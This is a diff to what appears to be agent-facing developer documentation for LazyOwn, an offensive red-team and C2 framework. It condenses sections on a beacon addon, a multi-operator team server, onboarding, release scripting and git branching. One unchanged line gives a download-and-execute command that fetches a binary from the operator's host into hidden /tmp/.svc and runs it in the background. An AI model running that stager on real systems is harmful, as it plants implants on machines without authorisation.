@@ -505,25 +505,36 @@ tool:
   execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
   lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
 ```
-Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. `os` defaults to `any`, `trigger` to `[]` — fill them so `explore`/`recommend_next`/`suggest_next` can surface the addon against discovered services. Tests: `tests/test_blacksandbeacon_addon.py` (59 — structure, required fields, path safety, placeholders, no hardcoded IPs/ports).
+Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. Fill `os`/`trigger` so `explore`/`recommend_next` surface the addon. Tests: `tests/test_blacksandbeacon_addon.py` (59).
 
 ---
 
 ## 15d. Multi-operator collaboration — `collab_bp`
 
-`modules/collab_bp.py` — Flask blueprint, real-time team server. Classes: `EventBus` (SSE pub/sub, replays last 20), `LockManager` (advisory per-target locks w/ TTL), `OperatorRegistry` (> 90s no heartbeat → inactive), `ColabEvent` (value object). Broadcast via `publish_event(type, payload, operator)`. Endpoints: `/collab/` (GET dashboard), `/collab/stream` (SSE), `/collab/operators`, `/collab/publish` (POST), `/collab/lock`/`/unlock` (POST), `/collab/history` (GET). Config injection via `current_app.config.get("LAZYOWN_CONFIG")`. Tests: `tests/test_collab_and_onboarding.py` (67 tests).
+`modules/collab_bp.py`: `EventBus` (SSE, replay 20), `LockManager` (per-target TTL locks), `OperatorRegistry` (90s heartbeat), `ColabEvent`. Endpoints: `/collab/`, `/collab/stream`, `/operators`, `/publish`, `/lock`, `/unlock`, `/history`. Tests: `tests/test_collab_and_onboarding.py`.
 
 ## 15e. Onboarding — `QUICKSTART.md` + `wizard`
 
-`QUICKSTART.md`: canonical operator onboarding, manual, update when the flow changes (prereqs, install, wizard, recon, C2, first shell, collab_join). `cli/wizard.py`: never imports `lazyown.py`/`lazyc2.py` (DIP); takes `params: dict` + `save: Callable`, outputs via `rich`, auto-detects `lhost` and SecLists. Run: `wizard` or `wizard --check`; auto-launched on first run when `rhost` unset. Operator identity is optional (skip → anonymous); `wizard --quick` auto-detects with no prompts; next-steps list `doctor` first.
+`QUICKSTART.md` is canonical onboarding (update when flow changes). `cli/wizard.py` never imports `lazyown.py`/`lazyc2.py`; takes `params` + `save`, auto-detects `lhost`. Run `wizard` / `wizard --check`; auto-launches on first run when `rhost` unset.
 
 ## 15f. Release — `DEPLOY.sh`
 
-Rebuilds `README.md` from `UTILS.md`+`COMMANDS.md`+`CHANGELOG.md`, regenerates `docs/index.html`, bumps `version.json`, signed commit+tag, GH release. Non-interactive: `printf "1\nfeat\nsubject\nbody\n" | bash DEPLOY.sh --no-test`. Bump: `feat/feature/fix/hotfix`=patch; `refactor/docs/test/style`=none; `release`=major.
+Rebuilds `README.md` + `docs/index.html`, bumps `version.json`, signed tag + GH release. Non-interactive: `printf "1\nfeat\nsubject\nbody\n" | bash DEPLOY.sh --no-test`.
 
 ## 15g. Branching strategy (law)
 
 Three-branch model: `dev` (active), `pp` (staging/QA), `main` (release). Flow: `feature/*` → `dev` → `pp` → `main`. Hotfix: branch from `main`, PR to `main`, back-merge to `pp` and `dev`. Agents work on `dev`.
+
+Mandatory sync before touching `dev` (`main` moves fast; stale `dev`
+silently drops commits). With a clean tree (stash if dirty):
+
+```sh
+git fetch origin main dev && git checkout dev
+git merge --ff-only origin/main || git merge --no-edit origin/main
+```
+
+`git merge-base --is-ancestor origin/main HEAD` must pass and
+`git rev-list --count HEAD..origin/main` must print 0. Otherwise STOP.
 
 ## 15h. claude_md_orchestrator skill
 
